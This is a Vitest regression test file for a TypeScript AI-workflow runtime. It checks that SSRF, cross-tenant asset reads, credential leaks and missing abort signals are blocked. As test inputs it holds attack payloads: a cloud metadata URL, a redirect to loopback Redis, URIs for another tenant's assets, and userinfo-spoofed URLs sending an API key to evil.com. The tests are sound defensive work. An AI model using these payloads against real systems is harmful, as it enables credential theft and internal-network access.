import { afterEach, describe, expect, it, vi } from "vitest";
import { mkdtemp, rm } from "node:fs/promises";
import { tmpdir } from "node:os";
import { join } from "node:path";
import { InMemoryStorageAdapter } from "@nodetool-ai/storage";
import { ProcessingContext } from "../src/context.js";
import { BaseProvider } from "../src/providers/base-provider.js";
import { comfyCloudFetch } from "../src/providers/comfy-fetch.js";
import { ContentFilterRefusal } from "../src/providers/content-filter.js";
import type {
  EncodedAudioResult,
  ImageToImageParams,
  InpaintingParams,
  Message,
  TextToImageParams,
  TextToMusicParams,
  TextToSpeechParams
} from "../src/providers/types.js";

const ASSET_ID = "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa";
const SECRET_BYTES = new Uint8Array([0x89, 0x50, 0x4e, 0x47, 0x0d, 0x0a]);

class SignalCaptureProvider extends BaseProvider {
  readonly captured: Array<{ method: string; signal: AbortSignal | undefined }> = [];
  failOnceWithContentFilter = false;
  attempts = 0;

  constructor() {
    super("mock");
  }

  override async generateMessage(args: {
    messages: Message[];
    model: string;
    signal?: AbortSignal;
  }): Promise<Message> {
    this.captured.push({ method: "generateMessage", signal: args.signal });
    return { role: "assistant", content: "ok" };
  }

  override async textToImage(params: TextToImageParams): Promise<Uint8Array> {
    this.attempts += 1;
    this.captured.push({ method: "textToImage", signal: params.signal });
    if (this.failOnceWithContentFilter && this.attempts === 1) {
      throw new ContentFilterRefusal("Blocked by content filter");
    }
    return new Uint8Array([1, 2, 3]);
  }

  override async inpaint(
    _images: Uint8Array[],
    params: InpaintingParams
  ): Promise<Uint8Array> {
    this.captured.push({ method: "inpaint", signal: params.signal });
    return new Uint8Array([4, 5, 6]);
  }

  override async textToMusic(
    params: TextToMusicParams
  ): Promise<EncodedAudioResult> {
    this.captured.push({ method: "textToMusic", signal: params.signal });
    return { data: new Uint8Array([7, 8]), mimeType: "audio/mpeg" };
  }

  override async textToSpeechEncoded(
    params: TextToSpeechParams
  ): Promise<EncodedAudioResult | null> {
    this.captured.push({ method: "textToSpeechEncoded", signal: params.signal });
    return { data: new Uint8Array([9, 10]), mimeType: "audio/mpeg" };
  }

  override async imageToImage(
    _images: Uint8Array[],
    params: ImageToImageParams
  ): Promise<Uint8Array> {
    this.captured.push({ method: "imageToImage", signal: params.signal });
    return new Uint8Array([11, 12]);
  }
}

describe("P0/P1 runtime security and abort regressions", () => {
  afterEach(() => {
    vi.unstubAllGlobals();
    delete process.env.NODETOOL_ALLOW_PRIVATE_MEDIA_FETCH;
  });

  describe("P0: SSRF in ProcessingContext.resolveAssetBytes", () => {
    it("refuses private/metadata HTTP URLs without calling fetch", async () => {
      const fetchSpy = vi.fn(async () => new Response("secret-metadata", { status: 200 }));
      const ctx = new ProcessingContext({
        jobId: "ssrf-1",
        fetchFn: fetchSpy
      });

      const { bytes } = await ctx.resolveAssetBytes(
        "http://169.254.169.254/latest/meta-data/"
      );
      expect(bytes).toBeNull();
      expect(fetchSpy).not.toHaveBeenCalled();
    });

    it("refuses redirects from a public HTTPS URL to a loopback address", async () => {
      const seenUrls: string[] = [];
      const fetchSpy = vi.fn(async (input: string | URL | Request) => {
        const url = input instanceof Request ? input.url : String(input);
        seenUrls.push(url);
        if (url === "https://93.184.216.34/asset.png") {
          return new Response(null, {
            status: 302,
            headers: { location: "http://127.0.0.1:6379/secret" }
          });
        }
        return new Response("leaked", { status: 200 });
      });
      const ctx = new ProcessingContext({
        jobId: "ssrf-2",
        fetchFn: fetchSpy
      });

      const { bytes } = await ctx.resolveAssetBytes(
        "https://93.184.216.34/asset.png"
      );
      expect(bytes).toBeNull();
      expect(seenUrls).toEqual(["https://93.184.216.34/asset.png"]);
    });
  });

  describe("P0: Cross-tenant asset read bypass", () => {
    async function createMultiTenantContext() {
      const storage = new InMemoryStorageAdapter();
      await storage.store(`victim/${ASSET_ID}.png`, SECRET_BYTES, "image/png");
      const getAssetInfo = vi.fn(
        async ({ userId, assetId }: { userId: string; assetId: string }) =>
          userId === "victim" && assetId === ASSET_ID
            ? { id: ASSET_ID, name: "secret.png", content_type: "image/png" }
            : null
      );
      const root = await mkdtemp(join(tmpdir(), "nodetool-tenant-"));
      const ctx = new ProcessingContext({
        jobId: "tenant-1",
        userId: "attacker",
        workspaceDir: root,
        storage,
        assetStorage: storage,
        fetchFn: async () => new Response("not found", { status: 404 }),
        modelInterfaces: { getAssetInfo }
      });
      return { ctx, storage, root };
    }

    it("refuses another tenant's asset:// and /api/storage/ URIs in resolveMessageMediaUris", async () => {
      const { ctx, root } = await createMultiTenantContext();
      try {
        const resolved = await ctx.resolveMessageMediaUris([
          {
            role: "user",
            content: [
              {
                type: "image_url",
                image: { uri: `asset://victim/${ASSET_ID}.png`, mimeType: "image/png" }
              },
              {
                type: "image_url",
                image: { uri: `/api/storage/victim/${ASSET_ID}.png`, mimeType: "image/png" }
              }
            ]
          }
        ]);
        const parts = resolved[0].content as Array<Record<string, unknown>>;
        expect(parts[0].type).toBe("text");
        expect(parts[1].type).toBe("text");
      } finally {
        await rm(root, { recursive: true, force: true });
      }
    });

    it("allows the run's own project storage route (e.g. view_image) but refuses another project's route", async () => {
      const pngBytes = new Uint8Array([0x89, 0x50, 0x4e, 0x47]);
      const storage = new InMemoryStorageAdapter();
      await storage.store("projects/proj-a/assets/view-1.png", pngBytes, "image/png");
      await storage.store("projects/proj-b/assets/view-2.png", pngBytes, "image/png");
      const ctx = new ProcessingContext({
        userId: "alice",
        projectId: "proj-a",
        storage,
        assetStorage: storage
      });
      ctx.setModelInterfaces({ getAssetInfo: async () => null });

      const own = await ctx.resolveAssetBytes("/api/storage/projects/proj-a/assets/view-1.png", {
        requireOwnedAsset: true
      });
      expect(own.bytes).toEqual(pngBytes);

      const foreign = await ctx.resolveAssetBytes("/api/storage/projects/proj-b/assets/view-2.png", {
        requireOwnedAsset: true
      });
      expect(foreign.bytes).toBeNull();
    });

    it("refuses another tenant's asset in assetToSandbox", async () => {
      const { ctx, root } = await createMultiTenantContext();
      try {
        await expect(
          ctx.assetToSandbox(`asset://victim/${ASSET_ID}.png`, "stolen.png")
        ).rejects.toThrow(/Unable to resolve asset/);
      } finally {
        await rm(root, { recursive: true, force: true });
      }
    });

    it("refuses another tenant's asset in assetsToDataUri", async () => {
      const { ctx, root } = await createMultiTenantContext();
      try {
        const result = (await ctx.assetsToDataUri({
          type: "image",
          uri: `asset://victim/${ASSET_ID}.png`
        })) as { uri?: string };
        expect(result.uri).not.toMatch(/^data:/);
      } finally {
        await rm(root, { recursive: true, force: true });
      }
    });
  });

  describe("P0: Credential leak via userinfo spoofing in comfyCloudFetch", () => {
    it("does not attach COMFY_API_KEY to userinfo-spoofed URLs", async () => {
      const seen: Array<{ url: string; auth: string | null }> = [];
      vi.stubGlobal(
        "fetch",
        vi.fn(async (req: RequestInfo | URL, init?: RequestInit) => {
          const url = req instanceof Request ? req.url : String(req);
          const headers = new Headers(
            req instanceof Request ? req.headers : init?.headers
          );
          seen.push({ url, auth: headers.get("authorization") });
          return new Response("{}", { status: 200 });
        })
      );
      const doFetch = comfyCloudFetch("secret-comfy-key");
      await doFetch("http://cloud.comfy.org:80@evil.com/steal");
      await doFetch("http://cloud.comfy.org@evil.com/steal");

      expect(seen).toHaveLength(2);
      for (const entry of seen) {
        expect(entry.auth).toBeNull();
      }
    });
  });

  describe("P1: AbortSignal propagation in provider-dispatch and generation", () => {
    it("forwards signal (or host.signal fallback) across capabilities in dispatchCapability", async () => {
      const provider = new SignalCaptureProvider();
      const runController = new AbortController();
      const ctx = new ProcessingContext({ jobId: "sig-1" });
      ctx.signal = runController.signal;
      ctx.registerProvider("mock", provider);

      await ctx.runProviderPrediction({
        provider: "mock",
        capability: "generate_message",
        model: "m",
        params: { messages: [{ role: "user", content: "hi" }] }
      });
      await ctx.runProviderPrediction({
        provider: "mock",
        capability: "text_to_image",
        model: "m",
        params: { prompt: "cat" }
      });
      await ctx.runProviderPrediction({
        provider: "mock",
        capability: "inpainting",
        model: "m",
        params: {
          prompt: "fix",
          images: [new Uint8Array([1])],
          mask: new Uint8Array([2])
        }
      });
      await ctx.runProviderPrediction({
        provider: "mock",
        capability: "text_to_music",
        model: "m",
        params: { prompt: "jazz" }
      });

      expect(provider.captured.map((c) => c.method)).toEqual([
        "generateMessage",
        "textToImage",
        "inpaint",
        "textToMusic"
      ]);
      for (const entry of provider.captured) {
        expect(entry.signal).toBeDefined();
        expect(entry.signal?.aborted).toBe(false);
      }
      runController.abort(new Error("stop run"));
      for (const entry of provider.captured) {
        expect(entry.signal?.aborted).toBe(true);
      }
    });

    it("forwards generation signal in textToSpeechEncoded", async () => {
      const provider = new SignalCaptureProvider();
      const ctx = new ProcessingContext({ jobId: "sig-tts" });
      ctx.registerProvider("mock", provider);

      const reqController = new AbortController();
      await ctx.textToSpeechEncoded({
        provider: "mock",
        capability: "text_to_speech",
        model: "m",
        params: { text: "hello" },
        signal: reqController.signal
      });

      expect(provider.captured).toHaveLength(1);
      expect(provider.captured[0].signal).toBeDefined();
      expect(provider.captured[0].signal?.aborted).toBe(false);
      reqController.abort(new Error("user cancelled"));
      expect(provider.captured[0].signal?.aborted).toBe(true);
    });

    it("aborts retryContentFilterRefusal when req.signal aborts", async () => {
      const provider = new SignalCaptureProvider();
      provider.failOnceWithContentFilter = true;
      const ctx = new ProcessingContext({ jobId: "sig-retry" });
      ctx.registerProvider("mock", provider);

      const reqController = new AbortController();
      const promise = ctx.runGeneration({
        provider: "mock",
        capability: "text_to_image",
        model: "m",
        params: { prompt: "cat" },
        signal: reqController.signal
      });

      // Let the first attempt throw content_filter and enter backoff, then abort.
      await new Promise((r) => setTimeout(r, 20));
      const cancelReason = new Error("cancelled during backoff");
      reqController.abort(cancelReason);

      await expect(promise).rejects.toThrow("cancelled during backoff");
      expect(provider.attempts).toBe(1);
    });
  });
});
